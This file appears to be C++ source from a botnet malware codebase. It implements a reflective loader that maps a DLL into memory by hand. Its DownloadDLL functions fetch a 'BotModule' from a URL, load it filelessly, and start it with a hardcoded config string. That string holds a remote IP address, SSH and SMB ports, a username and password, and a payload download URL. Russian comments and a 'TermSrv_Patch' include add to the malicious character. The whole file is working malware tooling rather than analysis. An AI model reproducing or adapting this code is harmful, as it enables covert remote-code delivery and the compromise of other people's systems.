#include "stdafx.h"
#include <windows.h>

#include "DllLoader.h"
#include "TermSrv_Patch\Load.h"
typedef struct
{
	PIMAGE_NT_HEADERS headers;
	unsigned char *codeBase;
	HMODULE *modules;
	int numModules;
	int initialized;
} MEMORYMODULE, *PMEMORYMODULE;

#define IMAGE_SIZEOF_BASE_RELOCATION         8

typedef BOOL ( WINAPI *DllEntryProc )( HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved );

#define GET_HEADER_DICTIONARY( module, idx ) &(module)->headers->OptionalHeader.DataDirectory[idx]

VOID MemFree( LPVOID lpAddr )
{
	if ( lpAddr != NULL )
		VirtualFree( lpAddr, 0, MEM_RELEASE );
}
DWORD GetMemSize( LPVOID lpAddr )
{
	if ( !lpAddr )
	{
		return 0;
	}

	MEMORY_BASIC_INFORMATION MemInfo;

	VirtualQuery( lpAddr, &MemInfo, sizeof( MEMORY_BASIC_INFORMATION ) );

	return MemInfo.RegionSize;
}

LPVOID MemAlloc( DWORD dwSize )
{
	return VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE );
}

LPVOID MemRealloc( LPVOID lpAddr, DWORD dwSize )
{
    // Изменяем размер выделенного буфера памяти
	DWORD PrevLen = 0;

	// Определяем размер предыдущего блока
	if ( lpAddr )
		PrevLen = GetMemSize(lpAddr);

	//  Создаём новый буфер
	LPVOID NewAddr = NULL;
	if (dwSize > 0)
	{
		NewAddr = MemAlloc(dwSize);
		if (lpAddr && NewAddr && PrevLen)
		{
            // Копируем старую память
			if (dwSize < PrevLen)
            	PrevLen = dwSize;
			memcpy(NewAddr, lpAddr, PrevLen);
		}
	}

	if (lpAddr != NULL)
		MemFree(lpAddr);

	return NewAddr;
}


void CopySections( const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module )
{
	int i, size;
	unsigned char *codeBase = module->codeBase;
	unsigned char *dest;

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION( module->headers );

	for ( i = 0; i < module->headers->FileHeader.NumberOfSections; i++, section++ )
	{
		if ( section->SizeOfRawData == 0 )
		{
			size = old_headers->OptionalHeader.SectionAlignment;

			if ( size > 0 )
			{
				dest = (unsigned char *)VirtualAlloc( codeBase + section->VirtualAddress, size, MEM_COMMIT, PAGE_READWRITE );

				section->Misc.PhysicalAddress = (DWORD)dest;
				memset( dest, 0, size );
			}

			continue;
		}

		dest = (unsigned char *)codeBase + section->VirtualAddress; /**pVirtualAlloc( codeBase + section->VirtualAddress,
											  section->SizeOfRawData,
											  MEM_COMMIT,
											  PAGE_READWRITE );*/

		memcpy( dest, data + section->PointerToRawData, section->SizeOfRawData );

		section->Misc.PhysicalAddress = (DWORD)dest;
	}
}

int ProtectionFlags[2][2][2] = {
	{
		{PAGE_NOACCESS, PAGE_WRITECOPY},
		{PAGE_READONLY, PAGE_READWRITE},
	},
	{
		{PAGE_EXECUTE, PAGE_EXECUTE_WRITECOPY},
		{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE},
	},
};


void FinalizeSections( PMEMORYMODULE module )
{
	int i;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION( module->headers );
	
	for ( i = 0; i < module->headers->FileHeader.NumberOfSections; i++, section++ )
	{
		DWORD protect, oldProtect, size;

		int executable = (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
		int readable =   (section->Characteristics & IMAGE_SCN_MEM_READ) != 0;
		int writeable =  (section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

		if ( section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE )
		{
			///pVirtualFree((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, MEM_DECOMMIT);
			continue;
		}

		protect = ProtectionFlags[executable][readable][writeable];

		if ( section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED )
		{
			protect |= PAGE_NOCACHE;
		}

		size = section->SizeOfRawData;

		if ( size == 0 )
		{
			if ( section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA )
			{
				size = module->headers->OptionalHeader.SizeOfInitializedData;
			}
			else if ( section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA )
			{
				size = module->headers->OptionalHeader.SizeOfUninitializedData;
			}
		}

		if ( size > 0 )
		{
			///if ( pVirtualProtect((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, protect, &oldProtect) == 0 )
			{
				return;
			}
		}
	}
}

void PerformBaseRelocation( PMEMORYMODULE module, DWORD delta )
{
	DWORD i;
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY( module, IMAGE_DIRECTORY_ENTRY_BASERELOC );
	
	if ( directory->Size > 0 )
	{
		PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)( codeBase + directory->VirtualAddress );

		for (; relocation->VirtualAddress > 0; )
		{
			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + IMAGE_SIZEOF_BASE_RELOCATION);

			for ( i = 0; i < ((relocation->SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2 ); i++, relInfo++ )
			{
				DWORD *patchAddrHL;
				int type, offset;

				type = *relInfo >> 12;
				offset = *relInfo & 0xfff;
				
				switch ( type )
				{
					case IMAGE_REL_BASED_ABSOLUTE:
						break;

					case IMAGE_REL_BASED_HIGHLOW:
						patchAddrHL = (DWORD *)(dest + offset);
						*patchAddrHL += delta;
						break;

					default:
						break;
				}
			}

			relocation = (PIMAGE_BASE_RELOCATION)(((DWORD)relocation) + relocation->SizeOfBlock);
		}
	}
}


int BuildImportTable(PMEMORYMODULE module)
{
	int result=1;
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);
	
	if ( directory->Size > 0 )
	{
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory->VirtualAddress);

		for ( ; !IsBadReadPtr(importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++ )
		{
			DWORD *thunkRef, *funcRef;
			HMODULE handle = (HMODULE)LoadLibraryA( (LPCSTR)(codeBase + importDesc->Name) );

			if (handle == INVALID_HANDLE_VALUE)
			{
				result = 0;
				break;
			}

			HMODULE *p = (HMODULE*)MemRealloc( module->modules, (module->numModules+1)*(sizeof(HMODULE)) );
			module->modules = p;

			if (module->modules == NULL)
			{
				result = 0;
				break;
			}

			module->modules[module->numModules++] = handle;
			if (importDesc->OriginalFirstThunk)
			{
				thunkRef = (DWORD *)(codeBase + importDesc->OriginalFirstThunk);
				funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			} else {
				thunkRef = (DWORD *)(codeBase + importDesc->FirstThunk);
				funcRef = (DWORD *)(codeBase + importDesc->FirstThunk);
			}
			for (; *thunkRef; thunkRef++, funcRef++)
			{
				if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
				{
					*funcRef = (DWORD)GetProcAddress( handle, (LPCSTR)IMAGE_ORDINAL(*thunkRef) );
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
					*funcRef = (DWORD)GetProcAddress( handle, (LPCSTR)&thunkData->Name );
				}
				if (*funcRef == 0)
				{
					result = 0;
					break;
				}
			}

			if (!result)
				break;
		}
	}

	return result;
}

void MemoryFreeLibrary(HMEMORYMODULE mod)
{
	int i;
	PMEMORYMODULE module = (PMEMORYMODULE)mod;

	if (module != NULL)
	{
		if (module->initialized != 0)
		{
			DllEntryProc DllEntry = (DllEntryProc)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
			(*DllEntry)((HINSTANCE)module->codeBase, DLL_PROCESS_DETACH, 0);
			module->initialized = 0;
		}

		if (module->modules != NULL)
		{
			for (i=0; i<module->numModules; i++)
				if (module->modules[i] != INVALID_HANDLE_VALUE)
					FreeLibrary(module->modules[i]);

			MemFree(module->modules);
		}

		if (module->codeBase != NULL)
			VirtualFree(module->codeBase, 0, MEM_RELEASE);

		MemFree( module);
	}
}

#pragma optimize("", off)
HMEMORYMODULE MemoryLoadLibrary(const void *data)
{
	PMEMORYMODULE result;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS old_header;
	unsigned char *code, *headers;
	DWORD locationDelta;
	DllEntryProc DllEntry;
	BOOL successfull;

	dos_header = (PIMAGE_DOS_HEADER)data;
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}

	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(data))[dos_header->e_lfanew];
	if (old_header->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}

	code = (unsigned char *)VirtualAlloc((LPVOID)(old_header->OptionalHeader.ImageBase),
		old_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);

    if (code == NULL)
        code = (unsigned char *)VirtualAlloc(NULL,
            old_header->OptionalHeader.SizeOfImage,
            MEM_COMMIT,
            PAGE_READWRITE);
    
	if (code == NULL)
	{
		return NULL;
	}
	result = (PMEMORYMODULE)MemAlloc( sizeof(MEMORYMODULE) );
	result->codeBase = code;
	result->numModules = 0;
	result->modules = NULL;
	result->initialized = 0;

	/**pVirtualAlloc(code,
		old_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);*/

	headers = (unsigned char *)code; /**pVirtualAlloc(code,
		old_header->OptionalHeader.SizeOfHeaders,
		MEM_COMMIT,
		PAGE_READWRITE);*/
	

	memcpy(headers, dos_header, dos_header->e_lfanew + old_header->OptionalHeader.SizeOfHeaders);
	result->headers = (PIMAGE_NT_HEADERS)&((const unsigned char *)(headers))[dos_header->e_lfanew];

	result->headers->OptionalHeader.ImageBase = (DWORD)code;

	CopySections((const unsigned char*)data, old_header, result);

	locationDelta = (DWORD)(code - old_header->OptionalHeader.ImageBase);
	if (locationDelta != 0)
		PerformBaseRelocation(result, locationDelta);


	if (!BuildImportTable(result))
		goto error;


	FinalizeSections(result);

	if (result->headers->OptionalHeader.AddressOfEntryPoint != 0)
	{
		DllEntry = (DllEntryProc)(code + result->headers->OptionalHeader.AddressOfEntryPoint);
		if (DllEntry == 0)
		{
			goto error;
		}

		successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);

		if (!successfull)
		{
			goto error;
		}

		result->initialized = 1;
	}

	return (HMEMORYMODULE)result;

error:
	MemoryFreeLibrary(result);
	return NULL;
}

FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
{
	unsigned char *codeBase = ((PMEMORYMODULE)module)->codeBase;
	int idx=-1;
	DWORD i, *nameRef;
	WORD *ordinal;
	PIMAGE_EXPORT_DIRECTORY exports;
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY((PMEMORYMODULE)module, IMAGE_DIRECTORY_ENTRY_EXPORT);
	if (directory->Size == 0)
		return NULL;

	exports = (PIMAGE_EXPORT_DIRECTORY)(codeBase + directory->VirtualAddress);
	if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0)
		return NULL;

	nameRef = (DWORD *)(codeBase + exports->AddressOfNames);
	ordinal = (WORD *)(codeBase + exports->AddressOfNameOrdinals);

	for (i=0; i<exports->NumberOfNames; i++, nameRef++, ordinal++)
		if ( lstrcmpiA(name, (const char *)(codeBase + *nameRef)) == 0 )
		{
			idx = *ordinal;
			break;
		}

	if (idx == -1)
		return NULL;

	if ((DWORD)idx > exports->NumberOfFunctions)
		return NULL;

	return (FARPROC)(codeBase + *(DWORD *)(codeBase + exports->AddressOfFunctions + (idx*4)));
}

bool DownloadDLL(char *Url)
{
	LPBYTE BotModule  = NULL;
	DWORD dwLen;
	//BotModule=(LPBYTE)DownloadPlugin(Url,  &dwLen );
	if ( !DownloadInMem( Url, &BotModule, &dwLen ) )
	{
		return NULL;
	}
	

	HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );
	if (hLib==NULL)
	{		
		return 0;
	}

	typedef int (WINAPIV* PINIT) (char* config);
	typedef int (WINAPIV* PSTART)();
	typedef int (WINAPIV* PSTOP)();
	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);



	PINIT Init				= (PINIT)MemoryGetProcAddress( hLib, "Init" );
	PSTART Start			= (PSTART)MemoryGetProcAddress( hLib, "Start" );
	PSTOP Stop				= (PSTOP)MemoryGetProcAddress( hLib, "Stop" );
	PTakeBotGuid TakeBotGuid= (PTakeBotGuid)MemoryGetProcAddress( hLib, "TakeBotGuid" );


			  //'88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixer;http://www.cushyhost.com/download.php?img=73'
	char*ip   = "88.198.53.14;22;445;sshu;P@ssw0rd;system_help;fixer;http://www.cushyhost.com/download.php?img=73";
	int i=Init(ip);
	int w=Start();
	while ( 1 )// ждем команды на выключение
	{
		HANDLE tmp;
		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
		if ((DWORD)WaitForSingleObject(tmp, INFINITE))
		{
			Sleep(100);
		}
		else break;
	}
	int r=Stop();

/*	typedef void (WINAPI *PStartClient)( char *Server, int Port, char *Uid, int BrowserType );

	char StartClient_func[] = {'S','t','a','r','t','C','l','i','e','n','t',0};

	PStartClient StartClient = (PStartClient)MemoryGetProcAddress( hLib, StartClient_func );
	if (StartClient==NULL)
	{	
		return 0;
	}

	for (int i=0;i++;i<10)
	{
		StartClient("", 33, "", 0 );

	}


	

*/
	return 0;

}

bool DownloadDLL_(char *Url)
{
	LPBYTE BotModule  = NULL;
	DWORD dwLen;
	//BotModule=(LPBYTE)DownloadPlugin(Url,  &dwLen );
	if ( !DownloadInMem( Url, &BotModule, &dwLen ) )
	{
		return NULL;
	}
	

	HMEMORYMODULE hLib = MemoryLoadLibrary( BotModule );
	if (hLib==NULL)
	{		
		return 0;
	}

	typedef int (WINAPIV* PINIT) (char* config);
	typedef int (WINAPIV* PSTART)();
	typedef int (WINAPIV* PSTOP)();
	typedef int (WINAPIV* PTakeBotGuid)(char*boot_guid);
	
	PSTART Start			= (PSTART)MemoryGetProcAddress( hLib, "Start" );
	PSTOP Stop				= (PSTOP)MemoryGetProcAddress( hLib, "Stop" );

	int w=Start();
	while ( 1 )// ждем команды на выключение
	{
		HANDLE tmp;
		tmp= (HANDLE)OpenMutexA(MUTEX_ALL_ACCESS,false, "DllStop");
		if ((DWORD)WaitForSingleObject(tmp, INFINITE))
		{
			Sleep(100);
		}
		else break;
	}
	int r=Stop();
	MemoryFreeLibrary(hLib);
/*	typedef void (WINAPI *PStartClient)( char *Server, int Port, char *Uid, int BrowserType );

	char StartClient_func[] = {'S','t','a','r','t','C','l','i','e','n','t',0};

	PStartClient StartClient = (PStartClient)MemoryGetProcAddress( hLib, StartClient_func );
	if (StartClient==NULL)
	{	
		return 0;
	}
	for (int i=0;i++;i<10)
	{
		StartClient("", 33, "", 0 );
	}
*/
	return 0;

}